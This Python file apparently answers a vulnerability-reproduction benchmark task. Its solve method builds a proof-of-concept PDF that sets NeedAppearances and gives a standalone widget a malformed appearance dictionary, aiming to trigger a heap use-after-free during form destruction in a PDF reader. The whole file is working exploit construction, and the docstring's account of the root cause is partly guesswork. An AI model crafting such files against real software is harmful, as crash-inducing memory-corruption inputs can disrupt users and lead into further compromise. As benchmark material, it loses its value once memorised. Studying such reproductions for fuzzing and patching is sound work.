import sys

class Solution:
    """
    Generates a Proof-of-Concept (PoC) input that triggers a Heap Use After Free vulnerability.
    """
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability occurs during the destruction of standalone forms in a PDF.
        A reference counting error happens when a dictionary (`Dict`) is passed to an
        internal `Object()` constructor without incrementing the dictionary's reference count.
        This leads to an extra unref operation during destruction, causing a premature free.

        This PoC constructs a PDF file with a specifically crafted form field to trigger this bug.
        The key components are:
        1. An `/AcroForm` dictionary with the `/NeedAppearances` flag set to `true`. This flag
           instructs the PDF reader to regenerate the appearance streams for form fields,
           triggering the vulnerable code path.
        2. A "standalone" form field (a `/Widget` annotation) is placed on a page but not
           listed in the `/AcroForm`'s `/Fields` array. The reader is still expected to find
           and process annotations on the page.
        3. The widget's Appearance Dictionary (`/AP`) is malformed. The entry for its
           normal appearance (`/N`) is expected to be a stream object. Instead, we provide
           a direct dictionary.
        4. When the appearance generation code encounters this direct dictionary where a stream
           is expected, it enters a faulty code path. It likely wraps the dictionary in a
           temporary internal object representation, but fails to increment the dictionary's
           reference count.
        5. When this temporary object is destroyed, it decrements the reference count of the
           dictionary, leading to it being freed prematurely (Use After Free).
        6. Subsequent operations, such as the destruction of the widget annotation itself,
           will attempt to access the dangling pointer to this dictionary, leading to a crash.

        Args:
            src_path: Path to the vulnerable source code tarball (unused).

        Returns:
            bytes: The PoC PDF file that should trigger the vulnerability.
        """
        objects = []

        # Object 1: Document Catalog
        # The root of the PDF object hierarchy. Points to the page tree and the AcroForm dict.
        catalog = b"<< /Type /Catalog /Pages 2 0 R /AcroForm 5 0 R >>"
        objects.append(catalog)

        # Object 2: Page Tree
        # A simple page tree containing a single page.
        pages = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"
        objects.append(pages)

        # Object 3: Page Object
        # The single page of the document. It contains the vulnerable widget in its /Annots array.
        page = b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 600 800] /Resources <<>> /Annots [4 0 R] >>"
        objects.append(page)

        # Object 4: Widget Annotation (The vulnerable part)
        # The /AP dictionary's /N entry contains a direct dictionary instead of a stream object.
        # This dictionary mimics the structure of a Form XObject's dictionary to penetrate deeper
        # into the parser logic.
        widget_annot = b"""<<
            /Type /Annot
            /Subtype /Widget
            /FT /Tx
            /T (vulnerable_field)
            /Rect [100 100 200 120]
            /F 4
            /AP <<
                /N <<
                    /Type /XObject
                    /Subtype /Form
                    /BBox [0 0 100 20]
                >>
            >>
        >>"""
        objects.append(widget_annot)

        # Object 5: AcroForm Dictionary
        # '/NeedAppearances true' triggers the vulnerable appearance generation code path.
        # The '/Fields' array is empty, making the widget on the page "standalone".
        acroform = b"<< /Fields [] /NeedAppearances true >>"
        objects.append(acroform)

        # --- PDF File Construction ---

        # Build the PDF body by writing each object and tracking its offset.
        pdf_body_parts = []
        header = b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n"
        pdf_body_parts.append(header)
        
        offsets = []
        current_offset = len(header)

        for i, obj_content in enumerate(objects):
            obj_num = i + 1
            offsets.append(current_offset)

            # Compact the object content string and build the full object definition.
            content_cleaned = b' '.join(obj_content.split())
            obj_header = f"{obj_num} 0 obj\n".encode('latin1')
            obj_footer = b"\nendobj\n"
            
            obj_full = obj_header + content_cleaned + obj_footer
            pdf_body_parts.append(obj_full)
            current_offset += len(obj_full)
            
        xref_offset = current_offset
        body = b"".join(pdf_body_parts)

        # Build the Cross-Reference (xref) Table.
        num_total_objects = len(objects) + 1
        xref_table_parts = [
            b"xref",
            f"0 {num_total_objects}".encode('latin1'),
            b"0000000000 65535 f "
        ]
        for offset in offsets:
            xref_table_parts.append(f"{offset:010d} 00000 n ".encode('latin1'))
        
        xref_table = b"\n".join(xref_table_parts) + b"\n"

        # Build the Trailer.
        trailer_str = f"""trailer
<< /Size {num_total_objects} /Root 1 0 R >>
startxref
{xref_offset}
%%EOF"""
        trailer = trailer_str.encode('latin1')

        return body + xref_table + trailer